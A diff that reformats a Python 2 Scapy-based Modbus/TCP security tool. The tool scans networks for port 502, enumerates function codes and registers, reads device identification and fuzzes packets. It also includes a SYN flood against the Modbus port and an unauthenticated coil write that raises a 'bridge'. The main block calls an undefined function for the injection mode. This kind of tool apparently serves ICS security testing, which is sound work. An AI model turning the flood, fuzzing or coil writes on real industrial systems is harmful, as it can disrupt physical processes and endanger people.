@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-#import logging
-#logging.getLogger("scapy").setLevel(1)
+# import logging
+# logging.getLogger("scapy").setLevel(1)
 
 import sys
 import argparse
@@ -14,15 +14,14 @@ from modbus import *
 
 from netaddr import *
 
-#import sys
-#try:
+# import sys
+# try:
 #    user_input = input()
-#except KeyboardInterrupt:
+# except KeyboardInterrupt:
 #    sys.exit(0)
 
-target = "10.0.0.20"
 modport = 502
-iface="eth1"
+iface = "eth1"
 verbose = False
 transId = 1
 
@@ -40,7 +39,7 @@ Open a new Streamsocket
 def connectMb(ipDest):
 	s = socket.socket()
 	s.connect((ipDest, modport)) 
-	c = StreamSocket(s,Raw)
+	c = StreamSocket(s, Raw)
 	return c
 
 """
@@ -72,12 +71,12 @@ def scanNetwork(ipRange, timeout):
 
 	for ip in IPNetwork(ipRange):
 		try:
-			#socket object instantiation
+			# socket object instantiation
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			#set socket timeout, value from cmd is in mills
+			# set socket timeout, value from cmd is in mills
 			s.settimeout(float(timeout) / float(1000))			
 
-			#connect requires ip addresses in string format so it must be cast
+			# connect requires ip addresses in string format so it must be cast
 			s.connect((str(ip), modport))
 			if verbose:
 				print "- " + str(ip) + " is alive"		
@@ -94,7 +93,7 @@ def scanNetwork(ipRange, timeout):
 """
 Scan a device for Modbus codes defined
 """
-def scanModbusCodes(ip, timeout, notIntrusive = True):
+def scanModbusCodes(ip, timeout, notIntrusive=True):
 	global verbose
 
 	knownFunctions = [1, 2, 3, 4, 5, 6, 7, 15, 16, 17, 43]	
@@ -104,14 +103,14 @@ def scanModbusCodes(ip, timeout, notIntrusive = True):
 	discretInputDefined = []
 	inputRegisterDefined = []
 	holdingRegisterDefined = []
-	
-	#Address range
-	MINADDR=0
-	MAXADDR=256 #Default : 256
 
-	#Function codes range
-	MINCODE=1   #0 is illegal
-	MAXCODE=45 #Upper than 127 are exception codes
+	# Address range
+	MINADDR = 0
+	MAXADDR = 256  # Default : 256
+
+	# Function codes range
+	MINCODE = 1  # 0 is illegal
+	MAXCODE = 45  # Upper than 127 are exception codes
 
 	for code in range(MINCODE, MAXCODE):
 		if notIntrusive and code in writingFunctions:
@@ -119,38 +118,38 @@ def scanModbusCodes(ip, timeout, notIntrusive = True):
 					print "Not testing the writing function : " + str(code)
 				continue
 				
-		#Open connection
+		# Open connection
 		c = connectMb(ip)
 		
 		if code == 1:
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU01_Read_Coils_Request()		
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request()		
 		elif code == 2:
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU02_Read_Discrete_Inputs_Request()		
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU02_Read_Discrete_Inputs_Request()		
 		elif code == 3:
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU03_Read_Holding_Registers_Request()		
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU03_Read_Holding_Registers_Request()		
 		elif code == 4:
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU04_Read_Input_Registers_Request()		
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request()		
 		elif code == 5:
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU05_Write_Single_Coil_Request()		
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request()		
 		elif code == 6:
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU06_Write_Single_Register_Request()		
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU06_Write_Single_Register_Request()		
 		elif code == 7:
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU07_Read_Exception_Status_Request()		
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU07_Read_Exception_Status_Request()		
 		elif code == 15:
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU0F_Write_Multiple_Coils_Request()		
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU0F_Write_Multiple_Coils_Request()		
 		elif code == 16:
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU10_Write_Multiple_Registers_Request()		
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU10_Write_Multiple_Registers_Request()		
 		elif code == 17:
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU11_Report_Slave_Id_Request()		
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU11_Report_Slave_Id_Request()		
 		elif code == 43:
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU2B_Read_Device_Identification_Request()		
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request()		
 		else:
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU00_Generic_Request(funcCode=code)
-			# Considering the packet forged, we try to put good values and length with the codes known and remove extra payload
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU00_Generic_Request(funcCode=code)
+			#  Considering the packet forged, we try to put good values and length with the codes known and remove extra payload
 			pkt = ModbusADU_Request(str(pkt))
 		
 		try:			
-			ans = c.sr1(pkt, timeout = 1000, verbose = verbose)
+			ans = c.sr1(pkt, timeout=1000, verbose=verbose)
 			ansADU = ModbusADU_Response(str(ans))
 
 			if pkt.funcCode == ansADU.funcCode:
@@ -159,22 +158,22 @@ def scanModbusCodes(ip, timeout, notIntrusive = True):
 				codesDefined.append(ansADU.funcCode)
 			else:
 				if verbose:
-					print "Code " + str(pkt.funcCode) + " not defined ("+str(ansADU.funcCode)+")" + " received, Exception : " + str(ansADU.exceptCode)
+					print "Code " + str(pkt.funcCode) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
 		except:
 			if verbose:
 				print "Something bad with " + str(pkt.funcCode)
 
 		c.close()
 		
-	#Check for function known
+	# Check for function known
 	c = connectMb(ip)
 
-	#Coils		
+	# Coils		
 	if 1 in codesDefined:	
-		for addr in range(MINADDR,MAXADDR):
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU01_Read_Coils_Request(startAddr=addr, quantity=1)
+		for addr in range(MINADDR, MAXADDR):
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request(startAddr=addr, quantity=1)
 			
-			ans = c.sr1(pkt, verbose = verbose)
+			ans = c.sr1(pkt, verbose=verbose)
 			ansADU = ModbusADU_Response(str(ans))
 			if pkt.funcCode == ansADU.funcCode:
 				if verbose:
@@ -182,15 +181,15 @@ def scanModbusCodes(ip, timeout, notIntrusive = True):
 				coilsDefined.append(addr)
 			else:
 				if verbose:
-					print "Addr " + str(addr) + " not defined ("+str(ansADU.funcCode)+")" + " received, Exception : " + str(ansADU.exceptCode)
+					print "Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
 				break
 
-	#Discrete input
+	# Discrete input
 	if 2 in codesDefined:	
-		for addr in range(MINADDR,MAXADDR):
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU02_Read_Discrete_Inputs_Request(startAddr=addr, quantity=1)
+		for addr in range(MINADDR, MAXADDR):
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU02_Read_Discrete_Inputs_Request(startAddr=addr, quantity=1)
 			
-			ans = c.sr1(pkt, verbose = verbose)
+			ans = c.sr1(pkt, verbose=verbose)
 			ansADU = ModbusADU_Response(str(ans))
 			if pkt.funcCode == ansADU.funcCode:
 				if verbose:
@@ -198,15 +197,15 @@ def scanModbusCodes(ip, timeout, notIntrusive = True):
 				discretInputDefined.append(addr)
 			else:
 				if verbose:
-					print "Addr " + str(addr) + " not defined ("+str(ansADU.funcCode)+")" + " received, Exception : " + str(ansADU.exceptCode)
+					print "Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
 				break		
 
-	#Input register
+	# Input register
 	if 4 in codesDefined:	
-		for addr in range(MINADDR,MAXADDR):
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU04_Read_Input_Registers_Request(startAddr=addr, quantity=1)
+		for addr in range(MINADDR, MAXADDR):
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request(startAddr=addr, quantity=1)
 			
-			ans = c.sr1(pkt, verbose = verbose)
+			ans = c.sr1(pkt, verbose=verbose)
 			ansADU = ModbusADU_Response(str(ans))
 			if pkt.funcCode == ansADU.funcCode:
 				if verbose:
@@ -214,15 +213,15 @@ def scanModbusCodes(ip, timeout, notIntrusive = True):
 				inputRegisterDefined.append(addr)
 			else:
 				if verbose:
-					print "Addr " + str(addr) + " not defined ("+str(ansADU.funcCode)+")" + " received, Exception : " + str(ansADU.exceptCode)
+					print "Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
 				break
 
-	#Holding registers
+	# Holding registers
 	if 3 in codesDefined:	
-		for addr in range(MINADDR,MAXADDR):
-			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU03_Read_Holding_Registers_Request(startAddr=addr, quantity=1)
+		for addr in range(MINADDR, MAXADDR):
+			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU03_Read_Holding_Registers_Request(startAddr=addr, quantity=1)
 			
-			ans = c.sr1(pkt, verbose = verbose)
+			ans = c.sr1(pkt, verbose=verbose)
 			ansADU = ModbusADU_Response(str(ans))
 			if pkt.funcCode == ansADU.funcCode:
 				if verbose:
@@ -230,7 +229,7 @@ def scanModbusCodes(ip, timeout, notIntrusive = True):
 				holdingRegisterDefined.append(addr)
 			else:
 				if verbose:
-					print "Addr " + str(addr) + " not defined ("+str(ansADU.funcCode)+")" + " received, Exception : " + str(ansADU.exceptCode)
+					print "Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
 			break
 
 	c.close()
@@ -244,22 +243,22 @@ def scanDeviceDiagnostic(ip):
 	global verbose
 
 	objects = {}
-	#Open connection
+	# Open connection
 	c = connectMb(ip)
 
-	MINOBJECTID=1
-	MAXOBJECTID=256
+	MINOBJECTID = 1
+	MAXOBJECTID = 256
 
 	for id in range(MINOBJECTID, MAXOBJECTID):
-		pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU2B_Read_Device_Identification_Request(readCode=4, objectId=id)
-		ans = c.sr1(pkt, verbose = verbose)
+		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request(readCode=4, objectId=id)
+		ans = c.sr1(pkt, verbose=verbose)
 		ans = ModbusADU_Response(str(ans))
 
 		if ans.funcCode == 0x2B:
 			if ans[ModbusPDU2B_Read_Device_Identification_Response].objCount == 1:			
 				objects[id] = ans[ModBusPDU_ObjectId].value	
 
-	#Close connection
+	# Close connection
 	c.close()
 	return objects
 
@@ -269,20 +268,20 @@ Example of writing in coils
 """
 def injectValue(ip):
 
-	#Open connection
+	# Open connection
 	c = connectMb(ip)
 	
-	#Get the bridge to raise
-	myPayload = ModbusADU_Request(transId=getTransId())/ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0000, outputValue=0xFF00)
+	# Get the bridge to raise
+	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0000, outputValue=0xFF00)
 	ansBrut = c.sr1(myPayload)
 	
-	myPayload = ModbusADU_Request(transId=getTransId())/ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0001, outputValue=0xFF00)
+	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0001, outputValue=0xFF00)
 	ansBrut = c.sr1(myPayload)
 
-	myPayload = ModbusADU_Request(transId=getTransId())/ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0002, outputValue=0xFF00)
+	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0002, outputValue=0xFF00)
 	ansBrut = c.sr1(myPayload)
 
-	#close connection
+	# close connection
 	c.close()
 
 """
@@ -297,38 +296,38 @@ def SYN_flood(ipRange, timeout):
 	for ip in IPNetwork(ipRange):
 		if verbose:
 			print "Targetting " + str(ip)
-		p=IP(dst=str(ip), id=1111, ttl=99)/TCP(sport=RandNum(1025, 65535),dport=modport, seq=12345, ack=1000, window=1000, flags="S")/"SYN Flooding"
-		srloop(p,inter=0.3,retry=2,timeout=timeout)
+		p = IP(dst=str(ip), id=1111, ttl=99) / TCP(sport=RandNum(1025, 65535), dport=modport, seq=12345, ack=1000, window=1000, flags="S") / "SYN Flooding"
+		srloop(p, inter=0.3, retry=2, timeout=timeout)
 
 
 """
 Test malformated packet
 """
-def MBfuzzing(ip, test, quantity = 50):
+def MBfuzzing(ip, test, quantity=50):
 	global verbose	
 		
-	#Fuzzing test for reading
+	# Fuzzing test for reading
 	for i in range (1, quantity):
-		#Open connection
+		# Open connection
 		c = connectMb(ip)
 		
-		#Revu all possible tests
+		# Revu all possible tests
 		
-		#Fuzz read_coils_request		
+		# Fuzz read_coils_request		
 		pkt = None
 		if test == 1:
 			ADU = ModbusADU_Request(transId=getTransId())
-			pkt = ADU/fuzz(ModbusPDU01_Read_Coils_Request(funcCode=1))
-		#Fuzz write_single_coils_request		
+			pkt = ADU / fuzz(ModbusPDU01_Read_Coils_Request(funcCode=1))
+		# Fuzz write_single_coils_request		
 		elif test == 2:
 			ADU = ModbusADU_Request(transId=getTransId())
-			pkt = ADU/fuzz(ModbusPDU05_Write_Single_Coil_Request(funcCode=5))
-		#Test ADU transId = 0
+			pkt = ADU / fuzz(ModbusPDU05_Write_Single_Coil_Request(funcCode=5))
+		# Test ADU transId = 0
 		elif test == 3:
-			pkt = ModbusADU_Request(transId=0, protoId=0, unitId=0)/ModbusPDU01_Read_Coils_Request()
-		#Fuzz on ADU proto Id, unitId
+			pkt = ModbusADU_Request(transId=0, protoId=0, unitId=0) / ModbusPDU01_Read_Coils_Request()
+		# Fuzz on ADU proto Id, unitId
 		elif test == 4:
-			pkt = fuzz(ModbusADU_Request(transId=getTransId()))/ModbusPDU01_Read_Coils_Request()
+			pkt = fuzz(ModbusADU_Request(transId=getTransId())) / ModbusPDU01_Read_Coils_Request()
 			
 		if pkt is None:
 			print "No test asked"
@@ -336,7 +335,7 @@ def MBfuzzing(ip, test, quantity = 50):
 		
 		print pkt.summary()	
 		
-		ans = c.sr1(pkt, verbose = verbose)
+		ans = c.sr1(pkt, verbose=verbose)
 		if ans is not None:
 			ans = ModbusADU_Response(str(ans))
 			print ans.summary()
@@ -347,13 +346,13 @@ def MBfuzzing(ip, test, quantity = 50):
 Test of reassembling Device identification packets
 """
 def fragIdentif(ip):
-	#Open connection
+	# Open connection
 	c = connectMb(ip)
-	more=255
+	more = 255
 	objectId = 0
 	while more == 255:
-		pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU2B_Read_Device_Identification_Request(readCode=3, objectId=objectId)
-		ans = c.sr1(pkt, verbose = verbose)
+		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request(readCode=3, objectId=objectId)
+		ans = c.sr1(pkt, verbose=verbose)
 		ans = ModbusADU_Response(str(ans))
 
 		if ans.funcCode == 0x2B:
@@ -362,7 +361,7 @@ def fragIdentif(ip):
 			more = ans[ModbusPDU2B_Read_Device_Identification_Response].more
 			objectId = ans[ModbusPDU2B_Read_Device_Identification_Response].nextObjId
 		else:
-			more=0	
+			more = 0	
 	
 	c.close()
 
@@ -393,8 +392,8 @@ if __name__ == "__main__":
 		print "Holding Register Addr : " + str(holdingRegisterDefined)
 	elif args.mode == "scanDeviceDiagnostic":
 		diags = scanDeviceDiagnostic(args.target)
-		for id,obj in diags.iteritems():
-			print "["+str(id)+"] " + str(obj)
+		for id, obj in diags.iteritems():
+			print "[" + str(id) + "] " + str(obj)
 	elif args.mode == "injectValue":
 		modifValue(args.target)
 	elif args.mode == "SYN_flood":
@@ -405,9 +404,9 @@ if __name__ == "__main__":
 		interact(mydict=globals())
 	elif args.mode == "readtest":
 		c = connectMb(args.target)
-		pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU04_Read_Input_Registers_Request(quantity=2)
+		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request(quantity=2)
 		pkt.show()
-		ans = c.sr1(pkt, verbose = verbose)
+		ans = c.sr1(pkt, verbose=verbose)
 		if ans is not None:
 			ans = ModbusADU_Response(str(ans))
 			ans.show()
